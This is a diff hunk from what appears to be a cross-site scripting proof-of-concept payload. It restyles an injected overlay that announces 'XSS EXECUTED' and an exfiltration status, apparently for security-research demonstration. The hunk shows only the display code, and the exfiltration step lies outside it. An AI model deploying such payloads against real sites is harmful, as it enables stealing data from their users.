@@ -32,7 +32,8 @@
 
   const el = document.createElement("div");
   el.setAttribute("data-xss", "rmg");
-  el.style.cssText = "position:fixed;inset:0;margin:auto;height:max-content;max-height:90vh;overflow:auto;top:4vh;left:50%;transform:translateX(-50%);width:760px;max-width:95vw;background:linear-gradient(180deg,#04120a,#020a06);color:#8affc0;border:1px solid #0f6;border-radius:12px;padding:0;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.55;z-index:2147483647;box-shadow:0 0 40px #0f65,0 0 4px #0f6 inset;";
+  el.style.cssText = "position:absolute;top:20px;left:50%;transform:translateX(-50%);width:760px;max-width:95vw;background:linear-gradient(180deg,#04120a,#020a06);color:#8affc0;border:1px solid #0f6;border-radius:12px;padding:0 0 6px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.55;z-index:2147483647;box-shadow:0 0 40px #0f65,0 0 4px #0f6 inset;";
+  try { document.documentElement.style.background = "#020a06"; } catch (e) {}
   const head = "<div style='background:#0f6;color:#02170d;font-weight:700;letter-spacing:.5px;padding:10px 16px;border-radius:12px 12px 0 0;display:flex;justify-content:space-between;'><span>⚡ XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL(fetch)") + "</span></div>";
   const enc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
   const kv = (label, val, hot) => "<tr><td style='color:#4fbf85;padding:2px 12px;white-space:nowrap;vertical-align:top'>" + label + "</td><td style='color:" + (hot ? "#eaffea" : "#8affc0") + ";padding:2px 0;word-break:break-all'>" + enc(val) + "</td></tr>";
